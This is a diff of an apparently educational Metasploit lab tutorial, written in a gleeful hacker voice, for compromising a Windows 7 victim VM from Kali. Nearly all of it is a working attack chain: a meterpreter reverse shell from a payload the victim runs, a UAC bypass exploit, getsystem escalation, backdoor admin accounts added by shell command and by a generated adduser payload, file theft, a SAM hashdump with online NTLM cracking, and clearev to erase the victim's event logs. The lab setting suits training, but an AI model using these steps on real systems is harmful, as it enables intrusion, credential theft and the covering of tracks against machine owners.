+5.	Run your Windows 7 VM “victim” machine
 	a.	Check the IP address using the cmd prompt to make sure you’re in the same range as the Kali machine
 	b.	If you are, open a browser and type <kali_ip_address>
 		i.	…you should see the “Apache2 Debian Default Page”
@@ -660,13 +654,10 @@ For this exercise you will need a Windows 7 VM to be the “victim”. You can e
 		i.	…once the file downloads run it
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: If you have problems downloading the file from Kali to your Windows VM then just do a transfer using a USB from one VM
-to another. You can use the top menu in your VM program (not the VM machine) to connect and disconnect the USB from one VM to
-the other. Also, depending on the VM software you are using there are several ways to do this and you may need additional
-software for the VM program itself. Google the problem if you’re stuck…this is the best way to troubleshoot and learn.
+Note: If you have problems downloading the file from Kali to your Windows VM then just do a transfer using a USB stick from one VM to another. You can use the top menu in your VM program (not the VM machine) to connect and disconnect the USB from one VM to the other. Also, depending on the VM software you are using there are several ways to do this and you may need additional software for the VM program itself. Google the problem if you’re stuck…that’s the best way to troubleshoot and learn.
 -------------------------------------------------------------------------------------------------------------------------------
 
-6.	Run the file in the victim’s machine then a meterpreter prompt will show up in Kali on the same terminal you ran msfconsole from
+6.	Run the evilfile.exe file in the victim’s machine, then in a meterpreter prompt should show up in Kali on the same terminal you ran msfconsole from
 
 7.	Here you can run several cool things like:
 	a.	Type help
@@ -681,41 +672,140 @@ software for the VM program itself. Google the problem if you’re stuck…this 
 		i.	…this will dump the file with the captured info
 	f.	Type shell
 		i.	…this will give you a cmd prompt shell inside meterpreter that you can use to run MS commands in the victim’s system
-	g.	Type net user evildoer P@$$w0rd! /add
-		i.	…yep, you now have an account in that machine! (((Muahahahahaa!!)))
-	h.	Type net localgroup Administrators evildoer /add
-		i.	…you now have admin rights! (((maniacal laugh…maniacal laugh!)))
-	i.	Type exit to exit out of the shell
+	g.	Type exit to exit out of the shell
 
 8.	Set the current session to background
 	a.	Type background
-		i.	…to view the sessions type sessions
-		ii.	…to return to a session type sessions # (where # is the Id number of that session)
 
-9.	Type use windows/adduser
-	a.	Type options
-	b.	Type set user evildoer
-	c.	Type set pass P@$$w0rd!
-	d.	Type set wmic true
-	e.	Type generate –t exe –f payload.exe
-	f.	Type ls to view file
+Privilege escalation in Windows 7 is a bit trickier than in XP but not by much. There are several ways to do escalation but I will not cover them all here. If you want to learn more about it then use your Googlefu skills.
 
-10.	Type sessions to view session list
+9.	Verify the number of the session in the background and if there are any old sessions kill them
+	a.	Type sessions
+	b.	Type sessions –k #
+		i.	…if you have any old/unused sessions
+
+10.	Back in msfconsole…
+	a.	Type use exploit/windows/local/bypassuac
+	b.	Type set session 1
+		i.	…this number must match the session Id from the previous exploit!!!!
+	c.	Type run or exploit
+		i.	…you will get a new meterpreter reverse shell
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: If you get a UAC Disabled error then that means that the security setting in the Action Center is set to OFF. This is not good for any user as anything will install without them knowing. Also this is not the default security setting for it.
+-------------------------------------------------------------------------------------------------------------------------------
+
+11.	Now to escalate our privileges in this computer through the current user’s account!
+	a.	Type getuid
+		i.	…the computer name and user info is displayed
+	b.	Type getsystem
+		i.	…do you see “Named Pipe Impersonation” on screen?! (((Muahahahaa!)))
+	c.	Type getuid
+		i.	…it should read NT AUTHORITY\SYSTEM…now we can execute programs through the cmd prompt! (((even more Muahahahaa!)))
+
+12.	At this point you can manually add or delete any user you want. We can do this by doing the following:
+	a.	Type shell to go back into the Windows shell
+	b.	Type net user evildoer P@$$W0rd! /add
+	c.	Type net user to verify
+
+13.	But let’s say you want to upload files with payloads and run them maybe to create a new account
+	a.	Type net user evildoer /delete
+
+14.	Place the current session to background
+	a.	Type background
+
+15.	Let’s create a new payload to add another user to the machine
+	a.	Type use windows/adduser
+	b.	Type options
+	c.	Type set user evildoer
+	d.	Type set pass P@$$w0rd!
+	e.	Type set wmic true
+	f.	Type generate –t exe –f payload.exe
+	g.	Type ls to view file
+
+16.	Type sessions to view session list
 	a.	Type sessions # (where # is the Id number of that session)
 		i.	…we’re back in meterpreter
 
-11.	Upload the payload to the victim’s machine. My original evildoer file was in the Downloads folder so…
+17.	Upload the payload to the victim’s machine. My original evildoer file which gave use the meterpreter shell was in the Downloads folder therefore when I upload this file it will go to that folder…
 	a.	Type pwd to find out where you are in the victim’s directory
-	b.	Type upload –f payload.exe
-	c.	Type dir to see the contents of the folder
-
-12.	Now the victim unknowingly clicks on payload.exe and it adds our new user to their machine
+	b.	Type upload –f payload.exe c:\\users\\<username>\\downloads
+		i.	…no, the \\ are NOT typos…check the message after uploading to see how they work
+	c.	Type shell then cd c:\users\<username>\downloads
+		i.	…username will be the current user you’re using
+	d.	Type dir to see the contents of the folder
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: If the victim has an elevated User Account Control Setting set to “Always Notify” then the payload will need to “Run as Administrator”
-otherwise, the payload will not work. Luckily for us Windows doesn’t have this security set as default and this is why it’s so easy to
-infect Windows machines
+Note: If you misplace an uploaded file use the where command in Windows shell to find its location
 -------------------------------------------------------------------------------------------------------------------------------
 
-13.	Type shell to create another shell to Windows 7
-	a.	Type net user to confirm the account has been created
+18.	Type payload.exe then net user to verify
+		i.	…type net user /help for more options n
+		ii.	…type net /h for other options
+
+19.	Type net user > list.txt
+	a.	…it creates a list of all users
+
+20.	The whoami command is a very useful and powerful tool indeed!
+	a.	Type whoami /all
+		i.	…shows you the current user rights to the system and other info
+	b.	Type whoami /user
+		i.	…shows you the current user SID
+	c.	Type whoami /priv
+		i.	…shows you the current user security privileges
+	d.	 Type whoami /?
+		i.	…shows the menu
+
+21.	Type whoami /all > curr_user.txt
+		i.	…it exports to a text file the current user data
+
+22.	Type exit to exit the Windows shell
+		i.	…you’re back in meterpreter
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: Did you know that you can dir to the victim from meterpreter without being in shell? Did you also noticed that this sentence made sense to you?!
+-------------------------------------------------------------------------------------------------------------------------------
+
+23.	These two commands are useful to have and only work from meterpreter and not from inside the Windows shell
+	a.	Type sysinfo
+		i.	…to view info of the machine
+	b.	Type ps
+		i.	…to view processes on the machine…do you see evildoer?
+
+24.	While in meterpreter, download the two files you just created
+	a.	Type download –f c:\\users\<username>\\downloads\\list.txt
+	b.	Type download –f c:\\users\<username>\\downloads\\curr_user.txt
+	c.	Type ls to verify they were downloaded
+		i.	…if they exist
+
+25.	Use cat to view the files
+	a.	Type cat list.txt
+	b.	Type cat curr_user.txt
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: I tried writing a small BASH script and found out that using a text editor like nano from within msfconsole will crash/freeze the session even if you put it in the background. If this happens to you don’t forget to check how many sessions you have running when you return to what you were doing; also kill any unused sessions you may have
+-------------------------------------------------------------------------------------------------------------------------------
+
+26.	Let’s try and get a hash dump to get into the system’s SAM file which holds all users and their keys…this may disconnect you
+	a.	Type run hashdump
+		i.	…you now have the SAM file with users and keys
+		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems in the wild unless you count ATM machines; the second part you can use against a rainbow table in a program or an online rainbow table website
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: Take a look at the numbers in the hash dump…what is 500 and 501? Google what they mean.
+-------------------------------------------------------------------------------------------------------------------------------
+
+27.	Copy the second part of the hash and just before the triple colons for the evildoer user
+	a.	Then open your browser and go to https://hashkiller.co.uk/ntlm-decrypter.aspx
+	b.	Use Ctrl+C to paste the hash in it
+	c.	Scroll down and enter the CAPTCHA then hit the submit button
+	d.	Scroll up and verify your hash was found…it will also spell it on the right side box
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: XP uses NT, Windows 7 and later uses NTLM
+-------------------------------------------------------------------------------------------------------------------------------
+
+28.	Since you now have the hash dump you can take all of them and save them with notepad++ so you can run them through rainbow tables
+
+29.	Type clearev
+a.	…clears the Application, System and Security logs at the victim’s machine…not really stealthy but will do the job
